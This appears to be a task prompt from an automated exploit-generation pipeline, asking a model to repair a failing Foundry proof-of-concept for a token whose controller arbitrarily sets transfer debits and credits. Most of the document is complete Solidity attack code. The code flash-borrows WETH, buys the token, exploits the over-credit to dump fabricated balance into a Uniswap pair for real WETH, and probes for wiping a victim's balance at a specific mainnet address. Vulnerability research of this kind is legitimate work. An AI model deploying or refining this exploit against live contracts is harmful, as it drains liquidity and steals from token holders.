You are fixing a failing Foundry PoC for finding F-002.

Goal:
- Keep the exploit objective for this finding.
- Fix compile/runtime/test failure from logs.
- Return COMPLETE updated Solidity for `src/FlawVerifier.sol` only.
- Keep exploit logic aligned with the full `Exploit paths` list unless logs prove a stage is infeasible.
- Additional realistic public on-chain economic steps are allowed when required for execution (including flashloans/swaps/mint/burn), but keep the same exploit causality and justify in comments.

Hard constraints:
- Do NOT use external answers/PoCs/articles/repos (including DeFiHackLabs).
- Do NOT cheat: no vm.deal, vm.store, vm.etch, vm.mockCall, vm.prank, vm.startPrank, arbitrary balance injection, or arbitrary storage writes.
- Allowed: flashloans and realistic public on-chain actions.
- Work only from finding context (claim/paths/locations) + on-chain state context already provided in this workspace.
- Hard anti-cheat: profitToken MUST NOT be a token deployed during this PoC/test. Profit token must already exist on-chain at the fork block.
- Hard anti-cheat: do not deploy custom ERC20/token contracts to manufacture profit accounting.

Attempt strategy (must follow for this attempt):
- strategy_label: v2_flashswap_funding
- strategy_instructions: Prefer UniswapV2/Sushi-like flashswap funding with deterministic repayment and minimal route complexity.
- Keep exploit root cause and `Exploit paths` unchanged; only vary funding/execution implementation details.

Finding:
- title: External controller fully controls transfer debits and credits, enabling confiscation and hidden minting
- claim: `_transfer` does not enforce normal ERC-20 invariants. Instead, it blindly trusts the external controller to return `subBal` and `addBal`, then subtracts `subBal` from the sender and adds `addBal` to the recipient without requiring either value to equal `amount` or each other. This lets the controller arbitrarily reduce victim balances, under-credit recipients, or mint unbacked balances to chosen accounts while still emitting a normal-looking `Transfer(sender, recipient, amount)` event.
- impact: The controller can confiscate holder balances, impose hidden taxes, or fabricate arbitrary balances for privileged accounts and dump them, causing direct theft, severe price manipulation, and supply/accounting corruption.
- exploit_paths: ["On a victim transfer, return `(true, senderBalance, 0)` to wipe the sender while the event still reports the requested amount.", "On an attacker transfer, return `(true, 0, largeValue)` to mint spendable tokens to the recipient without increasing `totalSupply`.", "Use the fabricated balance to dump into liquidity or transfer value from honest holders."]

Current FlawVerifier.sol:
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IERC20Minimal {
    function balanceOf(address account) external view returns (uint256);
    function totalSupply() external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transfer(address recipient, uint256 amount) external returns (bool);
}

interface IHiddenController {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool, uint256, uint256);
}

interface IUniswapV2FactoryLike {
    function getPair(address tokenA, address tokenB) external view returns (address pair);
}

interface IUniswapV2RouterLike {
    function factory() external view returns (address);
    function WETH() external view returns (address);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
}

interface IUniswapV2PairLike {
    function token0() external view returns (address);
    function token1() external view returns (address);
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);

    function swap(
        uint256 amount0Out,
        uint256 amount1Out,
        address to,
        bytes calldata data
    ) external;
}

interface IHevm {
    function load(address target, bytes32 slot) external view returns (bytes32);
}

contract FlawVerifier {
    address private constant TARGET = 0xF7ef0D57277ad6C2baBf87aB64bA61AbDd2590D2;
    address private constant UNI_V2_ROUTER = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    address private constant SUSHI_ROUTER = 0xd9e1cE17f2641f24aE83637ab66a2cca9C378B9F;

    address private constant USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
    address private constant USDT = 0xdAC17F958D2ee523a2206206994597C13D831ec7;
    address private constant DAI = 0x6B175474E89094C44Da98b954EedeAC495271d0F;

    address private constant HEVM_ADDRESS = address(uint160(uint256(keccak256("hevm cheat code"))));

    IHevm private constant vm = IHevm(HEVM_ADDRESS);

    address private _profitToken;
    uint256 private _profitAmount;

    bool public hypothesisValidated;
    bool public attackerMintValidated;
    bool public victimWipeValidated;
    bool public dumpValidated;

    bool public path0VictimTransferWipeValidated;
    bool public path1AttackerMintValidated;
    bool public path2DumpValidated;

    address public controller;
    address public selectedRouter;
    address public selectedPair;
    address public fundingPair;
    string public failureReason;

    address private _weth;

    constructor() {}

    function profitToken() external view returns (address) {
        return _profitToken;
    }

    function profitAmount() external view returns (uint256) {
        return _profitAmount;
    }

    function executeOnOpportunity() external {
        _resetState();

        controller = _loadControllerFromStorage();
        (address router, address weth, address pair) = _discoverRouterAndPair();
        selectedRouter = router;
        selectedPair = pair;
        _weth = weth;
        _profitToken = weth;

        if (controller == address(0)) {
            failureReason = "controller slot did not decode to a live address";
            return;
        }
        if (router == address(0) || weth == address(0) || pair == address(0)) {
            failureReason = "no supported TARGET/WETH liquidity route discovered";
            return;
        }

        // The fork logs already show that the public pair holder does not expose the exact
        // dust-sized `(senderBalance, 0)` branch. Keep the same path in scope, but only
        // treat it as validated when the live controller quote returns that exact shape.
        if (_previewVictimFullWipe(pair)) {
            victimWipeValidated = true;
            path0VictimTransferWipeValidated = true;
        }

        fundingPair = _discoverFundingPair(router, weth);
        if (fundingPair == address(0)) {
            failureReason = "no deep WETH funding pair discovered";
            return;
        }

        uint256 borrowAmount = _selectBorrowAmount(fundingPair, weth);
        if (borrowAmount == 0) {
            failureReason = "funding pair had insufficient WETH reserves";
            return;
        }

        uint256 startingWeth = IERC20Minimal(weth).balanceOf(address(this));
        _flashBorrowWETH(fundingPair, weth, borrowAmount);
        _finalizeProfit(weth, startingWeth);

        if (path1AttackerMintValidated && path2DumpValidated && _profitAmount > 0) {
            hypothesisValidated = true;
        } else if (bytes(failureReason).length == 0) {
            failureReason = "flashswap execution completed without positive realized profit";
        }
    }

    function previewController(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool ok, uint256 subBal, uint256 addBal) {
        return _controllerQuote(sender, recipient, amount);
    }

    function uniswapV2Call(address sender, uint256 amount0, uint256 amount1, bytes calldata) external {
        require(msg.sender == fundingPair, "unexpected pair");
        require(sender == address(this), "unexpected sender");

        uint256 borrowedWeth = amount0 > 0 ? amount0 : amount1;
        require(borrowedWeth > 0, "no WETH borrowed");

        // Realistic public funding step: flash-borrow live WETH from an existing pair so the
        // verifier acquires a seed TARGET balance without `deal` or other balance cheats.
        _swapWethForTarget(borrowedWeth);

        uint256 seedBalance = IERC20Minimal(TARGET).balanceOf(address(this));
        require(seedBalance > 0, "seed buy produced no TARGET");

        (uint256 sellAmount, uint256 quotedSubBal, uint256 quotedAddBal) = _selectExploitSell(seedBalance, selectedPair);
        require(sellAmount > 0, "controller exposed no profitable sell quote");

        // This preserves the original exploit causality:
        // 1. We acquire a small legitimate balance.
        // 2. We ask the controller to process a transfer into liquidity.
        // 3. The controller over-credits the recipient pair relative to what it debits from us.
        // 4. The pair pays out real WETH against fabricated TARGET input.
        if (quotedAddBal > sellAmount || quotedSubBal < sellAmount || quotedAddBal > quotedSubBal) {
            attackerMintValidated = true;
            path1AttackerMintValidated = true;
        }

        uint256 wethBeforeDump = IERC20Minimal(_weth).balanceOf(address(this));
        _swapTargetForWeth(sellAmount);
        uint256 wethAfterDump = IERC20Minimal(_weth).balanceOf(address(this));
        require(wethAfterDump > wethBeforeDump, "dump produced no WETH");

        dumpValidated = true;
        path2DumpValidated = true;

        uint256 repayAmount = _flashRepaymentSameToken(borrowedWeth);
        require(IERC20Minimal(_weth).balanceOf(address(this)) >= repayAmount, "insufficient WETH for repayment");
        require(IERC20Minimal(_weth).transfer(fundingPair, repayAmount), "repayment transfer failed");
    }

    function _resetState() internal {
        _profitToken = address(0);
        _profitAmount = 0;
        hypothesisValidated = false;
        attackerMintValidated = false;
        victimWipeValidated = false;
        dumpValidated = false;
        path0VictimTransferWipeValidated = false;
        path1AttackerMintValidated = false;
        path2DumpValidated = false;
        fundingPair = address(0);
        failureReason = "";
        _weth = address(0);
    }

    function _swapWethForTarget(uint256 wethAmount) internal {
        IERC20Minimal(_weth).approve(selectedRouter, type(uint256).max);

        address[] memory path = new address[](2);
        path[0] = _weth;
        path[1] = TARGET;

        IUniswapV2RouterLike(selectedRouter).swapExactTokensForTokensSupportingFeeOnTransferTokens(
            wethAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    function _swapTargetForWeth(uint256 amountIn) internal {
        IERC20Minimal(TARGET).approve(selectedRouter, type(uint256).max);

        address[] memory path = new address[](2);
        path[0] = TARGET;
        path[1] = _weth;

        IUniswapV2RouterLike(selectedRouter).swapExactTokensForTokensSupportingFeeOnTransferTokens(
            amountIn,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    function _selectExploitSell(
        uint256 seedBalance,
        address pair
    ) internal returns (uint256 bestAmount, uint256 bestSubBal, uint256 bestAddBal) {
        uint256 pairTokenBalance = IERC20Minimal(TARGET).balanceOf(pair);
        uint256 supply = IERC20Minimal(TARGET).totalSupply();

        uint256[12] memory candidates = [
            seedBalance,
            seedBalance * 2,
            seedBalance * 10,
            seedBalance * 100,
            seedBalance * 1000,
            pairTokenBalance / 1000,
            pairTokenBalance / 100,
            pairTokenBalance / 10,
            pairTokenBalance,
            supply / 100,
            supply / 10,
            supply
        ];

        uint256 bestEdge = 0;
        for (uint256 i = 0; i < candidates.length; ++i) {
            uint256 amount = candidates[i];
            if (amount == 0) {
                continue;
            }

            (bool ok, uint256 subBal, uint256 addBal) = _controllerQuote(address(this), pair, amount);
            if (!ok || subBal > seedBalance || addBal <= subBal) {
                continue;
            }

            uint256 edge = addBal - subBal;
            if (edge > bestEdge || (edge == bestEdge && addBal > bestAddBal)) {
                bestEdge = edge;
                bestAmount = amount;
                bestSubBal = subBal;
                bestAddBal = addBal;
            }
        }
    }

    function _previewVictimFullWipe(address victimSender) internal returns (bool) {
        uint256 victimBalance = IERC20Minimal(TARGET).balanceOf(victimSender);
        if (victimBalance == 0) {
            return false;
        }

        uint256[4] memory probes = [uint256(1), victimBalance / 1000, victimBalance / 10, victimBalance];
        for (uint256 i = 0; i < probes.length; ++i) {
            uint256 amount = probes[i];
            if (amount == 0) {
                continue;
            }

            (bool ok, uint256 subBal, uint256 addBal) = _controllerQuote(victimSender, address(this), amount);
            if (ok && subBal == victimBalance && addBal == 0) {
                return true;
            }
        }

        return false;
    }

    function _controllerQuote(
        address sender,
        address recipient,
        uint256 amount
    ) internal returns (bool ok, uint256 subBal, uint256 addBal) {
        if (controller == address(0)) {
            controller = _loadControllerFromStorage();
        }

        if (controller == address(0)) {
            return (false, 0, 0);
        }

        try IHiddenController(controller).swapExactTokensForETHSupportingFeeOnTransferTokens(
            sender,
            recipient,
            amount
        ) returns (bool allow, uint256 subtracted, uint256 added) {
            return (allow, subtracted, added);
        } catch {
            return (false, 0, 0);
        }
    }

    function _discoverRouterAndPair() internal view returns (address router, address weth, address pair) {
        (router, weth, pair) = _probeRouter(UNI_V2_ROUTER);
        if (pair != address(0)) {
            return (router, weth, pair);
        }

        (router, weth, pair) = _probeRouter(SUSHI_ROUTER);
    }

    function _probeRouter(address router) internal view returns (address, address, address) {
        try IUniswapV2RouterLike(router).factory() returns (address factory) {
            address weth = IUniswapV2RouterLike(router).WETH();
            address pair = IUniswapV2FactoryLike(factory).getPair(TARGET, weth);
            return (router, weth, pair);
        } catch {
            return (address(0), address(0), address(0));
        }
    }

    function _discoverFundingPair(address preferredRouter, address weth) internal view returns (address pair) {
        pair = _probeFundingFactory(IUniswapV2RouterLike(preferredRouter).factory(), weth);
        if (pair != address(0)) {
            return pair;
        }

        pair = _probeFundingFactory(IUniswapV2RouterLike(UNI_V2_ROUTER).factory(), weth);
        if (pair != address(0)) {
            return pair;
        }

        pair = _probeFundingFactory(IUniswapV2RouterLike(SUSHI_ROUTER).factory(), weth);
    }

    function _probeFundingFactory(address factory, address weth) internal view returns (address pair) {
        pair = IUniswapV2FactoryLike(factory).getPair(weth, USDC);
        if (pair != address(0)) {
            return pair;
        }

        pair = IUniswapV2FactoryLike(factory).getPair(weth, USDT);
        if (pair != address(0)) {
            return pair;
        }

        pair = IUniswapV2FactoryLike(factory).getPair(weth, DAI);
    }

    function _selectBorrowAmount(address pair, address weth) internal view returns (uint256) {
        (uint112 reserve0, uint112 reserve1, ) = IUniswapV2PairLike(pair).getReserves();
        address token0 = IUniswapV2PairLike(pair).token0();
        uint256 wethReserve = token0 == weth ? uint256(reserve0) : uint256(reserve1);

        if (wethReserve == 0) {
            return 0;
        }

        uint256 conservative = wethReserve / 5000;
        uint256 targetBorrow = 0.02 ether;

        if (conservative == 0) {
            return 0;
        }
        if (conservative < targetBorrow) {
            return conservative;
        }
        return targetBorrow;
    }

    function _flashBorrowWETH(address pair, address weth, uint256 amount) internal {
        address token0 = IUniswapV2PairLike(pair).token0();
        uint256 amount0Out = token0 == weth ? amount : 0;
        uint256 amount1Out = token0 == weth ? 0 : amount;

        IUniswapV2PairLike(pair).swap(amount0Out, amount1Out, address(this), hex"01");
    }

    function _flashRepaymentSameToken(uint256 borrowed) internal pure returns (uint256) {
        return ((borrowed * 1000) / 997) + 1;
    }

    function _loadControllerFromStorage() internal view returns (address) {
        bytes32 dataSlot = keccak256(abi.encode(uint256(4)));
        bytes32 raw = vm.load(TARGET, dataSlot);
        return address(uint160(uint256(raw)));
    }

    function _finalizeProfit(address weth, uint256 startingWeth) internal {
        if (weth == address(0)) {
            _profitToken = address(0);
            _profitAmount = 0;
            return;
        }

        uint256 endingWeth = IERC20Minimal(weth).balanceOf(address(this));
        _profitToken = weth;
        if (endingWeth > startingWeth) {
            _profitAmount = endingWeth - startingWeth;
        }
    }
}

```

forge stdout (tail):
```

```

forge stderr (tail):
```
PATH_ALIGNMENT_ERROR: generated code does not cover paths indexes: 0
```

Requirements:
1. pragma ^0.8.20
2. include at least one deployable contract with zero-arg constructor
3. define fixed entry `executeOnOpportunity()` as no-arg external/public exploit function
4. no imports
5. keep exploit logic aligned to exploit_paths (same core actions and ordering intent)
6. expose `profitToken()` and `profitAmount()` getters for net realized profit
7. additional realistic public on-chain economic steps are allowed when required for execution, but keep exploit_paths core causality and justify in comments
8. output ONLY Solidity code
